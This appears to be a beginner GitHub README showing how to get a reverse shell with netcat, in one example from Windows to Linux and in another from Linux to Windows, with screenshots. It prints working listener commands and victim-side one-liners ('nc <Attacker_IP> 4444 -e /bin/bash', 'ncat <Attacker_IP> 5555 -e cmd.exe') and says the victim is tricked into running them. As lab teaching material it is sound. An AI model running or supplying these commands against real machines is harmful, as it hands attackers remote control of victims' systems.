# Reverse-shell-access-using-netcat

I was gain a Reverse shell access uisng netcat in kali linux from windows ...vice versa

# What is Reverse shell access

A reverse shell is a type of connection where a target machine (the victim) initiates a connection back to an attacker’s machine. This allows the attacker to control the target machine remotely by executing commands on it.

# How Reverse Shell Works:

Attacker's Machine: Listens for incoming connections.

Victim's Machine: When compromised, it connects back to the attacker's machine, giving the attacker remote access.

# Two Simple Examples:

# Example 1: Attacker on Windows, Victim on Linux
**Attacker (Windows)**: Sets up a listener using netcat.

**Command**: ncat -lvp 4444

![Image Alt](https://github.com/goutham10248/Reverse-shell-access-using-netcat/blob/26834eb6bf472a46292b847cb73028b8c8d6a0c7/images/1.png)

**This means**: "Listen on port 4444 and wait for a connection."

**Victim** (Linux): The attacker tricks the victim into running a command.

**Command**: nc <**Attacker_IP**> 4444 -e /bin/bash

![Image Alt](https://github.com/goutham10248/Reverse-shell-access-using-netcat/blob/26834eb6bf472a46292b847cb73028b8c8d6a0c7/images/2.png)

**This means**: "Connect to the attacker's IP on port 4444 and give them access to my shell."

![Image Alt](https://github.com/goutham10248/Reverse-shell-access-using-netcat/blob/26834eb6bf472a46292b847cb73028b8c8d6a0c7/images/3.png)

**Result**: The attacker now controls the Linux machine from the Windows machine.

![Image Alt](https://github.com/goutham10248/Reverse-shell-access-using-netcat/blob/26834eb6bf472a46292b847cb73028b8c8d6a0c7/images/4.png)

# Example 2: Attacker on Linux, Victim on Windows
**Attacker** (Linux): Listens for incoming connections.

**Command**: nc -lvp 5555

![Image Alt](https://github.com/goutham10248/Reverse-shell-access-using-netcat/blob/a8b13cfa76e8c0df3e40224d2b9f102ba15a2039/images/5.png)

**Victim** (Windows): The attacker gets the victim to run this command.

**Command**: ncat <**Attacker_IP**> 5555 -e cmd.exe

![Image Alt](https://github.com/goutham10248/Reverse-shell-access-using-netcat/blob/a8b13cfa76e8c0df3e40224d2b9f102ba15a2039/images/6.png)

**This means**: "Connect to the attacker’s IP on port 5555 and give them access to my Windows command prompt."

![Image Alt](https://github.com/goutham10248/Reverse-shell-access-using-netcat/blob/a8b13cfa76e8c0df3e40224d2b9f102ba15a2039/images/7.png)

**Result**: The attacker now has control over the Windows machine.

![Image Alt](https://github.com/goutham10248/Reverse-shell-access-using-netcat/blob/a8b13cfa76e8c0df3e40224d2b9f102ba15a2039/images/8.png)

# In Summary:
**Reverse Shell**: The victim's machine connects back to the attacker's machine.
**Purpose**: Allows remote control over the victim's machine.
**Usage**: Often used in penetration testing or by hackers.
